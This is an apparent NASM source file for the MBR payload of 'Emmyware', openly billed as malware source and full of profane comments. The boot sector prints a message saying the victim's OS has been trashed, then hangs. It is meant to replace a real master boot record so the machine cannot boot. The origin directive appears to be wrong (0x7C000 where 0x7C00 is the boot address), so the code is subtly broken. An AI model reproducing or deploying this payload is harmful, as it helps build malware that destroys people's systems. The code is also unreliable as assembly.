; To compile this, you will need to do "nasm EmmyWareMbr.asm -o EmmyWareMbr.bin" and use file to hex converter.
; The Emmyware MBR source code... NOW PUBLICY AVALIBILE!!!!!
; A very simple MBR program for basic assembly noobs (*gasp* what the fuuuuuck!)
; HERE WE GO BITCH
; FUCK YEAH!
BITS 16 ; Always gotta have that 16 bits (yuhh)
ORG 0x7C000

start:
    mov si, message ; The message will be defined later OK BITCHES DONT GET MAD AT ME
	
print_loop:
    ; We gotta loop the print, but don't make it go on forever (that's what the halt is for you bastard)
    lodsb
	or al, al
	jz done
	mov ah, 0x0E
	int 0x10
	jmp print_loop
	
done:
    cli
	
hang:
    ; Halt my ass!
    hlt
	jmp hang
	
; iLove Messages In x86 Assembly!!! Totally!!!
message db "Game Over! You tried to guess the code, but you failed. Your OS has been trashed by the way! Emmyware made by EmmyMalware.", 0

; Here comes the dammed MBR signiture! Damn you vile woman!
times 510-($-$$) db 0
dw 0xAA55
